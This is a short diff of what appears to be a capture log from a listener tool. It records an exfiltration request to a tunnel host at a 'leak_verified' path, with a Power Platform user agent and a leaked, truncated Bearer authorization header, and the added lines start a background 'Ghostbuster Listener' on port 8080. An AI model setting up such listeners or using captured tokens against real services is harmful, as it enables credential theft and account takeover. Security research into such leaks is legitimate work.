@@ -5,3 +5,5 @@ TARGET_URI: http://22f2f1647fc9fc.lhr.life/leak_verified
 USER_AGENT: Mozilla/5.0 (Microsoft Power Platform Runtime)
 LEAKED_HEADER: Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...[TRUNCATED_SENSITIVE_DATA]
 ----------------------------------------------------------------
+nohup: ignoring input
+Ghostbuster Listener V2 active on 8080...
